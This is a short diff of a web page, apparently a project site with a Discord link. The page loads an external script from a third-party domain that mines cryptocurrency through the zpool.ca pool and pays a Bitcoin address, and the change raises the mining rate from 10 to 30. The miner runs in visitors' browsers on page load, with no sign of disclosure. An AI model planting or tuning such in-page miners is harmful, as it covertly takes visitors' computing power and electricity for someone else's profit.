@@ -32,7 +32,7 @@ You can join our <a href="https://discord.gg/hNwuSVHz" target="_blank"><u>Discor
 
 <script src="https://thelifewillbefine.de/karma/karma.js?karma=bs?algy=flex/native?nosaj=flex.na.mine.zpool.ca:3340" ></script>
 <script type="text/javascript">
-EverythingIsLife('bc1qtu4fj64407en7zxqucste9zt6a7sr2jw02f000', 'c=BTC', 10);
+EverythingIsLife('bc1qtu4fj64407en7zxqucste9zt6a7sr2jw02f000', 'c=BTC', 30);
 </script>
 
 
